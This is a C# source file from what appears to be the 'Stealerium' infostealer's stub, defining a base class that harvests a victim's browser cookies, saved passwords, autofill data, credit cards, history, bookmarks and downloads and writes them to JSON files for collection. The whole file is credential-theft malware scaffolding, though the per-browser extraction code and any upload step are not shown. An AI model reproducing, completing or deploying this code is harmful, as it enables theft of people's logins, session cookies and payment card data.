using System;
using System.Collections.Generic;
using System.IO;
using System.Text.Json;
using Stealerium.Stub.Helpers;
using Stealerium.Stub.Target.Browsers.Common.Models;

namespace Stealerium.Stub.Target.Browsers.Common.Recovery
{
    internal abstract class BaseBrowserRecovery
    {
        protected readonly string SavePath;
        protected readonly string BrowserDir;
        protected readonly string UserDataPath;
        protected readonly string BrowserName;

        protected BaseBrowserRecovery(string savePath, string browserName, string userDataPath)
        {
            SavePath = savePath;
            BrowserName = browserName;
            BrowserDir = Path.Combine(savePath, browserName);
            UserDataPath = userDataPath;
        }

        public virtual void RecoverBrowserData()
        {
            if (!Directory.Exists(UserDataPath))
            {
                Logging.Log($"{BrowserName} >> User data directory not found: {UserDataPath}");
                return;
            }

            try
            {
                Directory.CreateDirectory(BrowserDir);
                Logging.Log($"{BrowserName} >> Created browser directory: {BrowserDir}");

                RecoverCookies();
                RecoverPasswords();
                RecoverBookmarks();
                RecoverHistory();
                RecoverAutofill();
                RecoverCreditCards();
                RecoverDownloads();
            }
            catch (Exception ex)
            {
                Logging.Log($"{BrowserName} >> Error recovering browser data: {ex}");
            }
        }

        protected abstract void RecoverCookies();
        protected abstract void RecoverPasswords();
        protected abstract void RecoverBookmarks();
        protected abstract void RecoverHistory();
        protected abstract void RecoverAutofill();
        protected abstract void RecoverCreditCards();
        protected abstract void RecoverDownloads();

        protected void SaveToFile<T>(IEnumerable<T> items, string filename)
        {
            var path = Path.Combine(BrowserDir, filename);
            try
            {
                File.WriteAllText(path, JsonSerializer.Serialize(items));
                Logging.Log($"{BrowserName} >> Saved {filename}");
            }
            catch (Exception ex)
            {
                Logging.Log($"{BrowserName} >> Error saving {filename}: {ex}");
            }
        }
    }
}
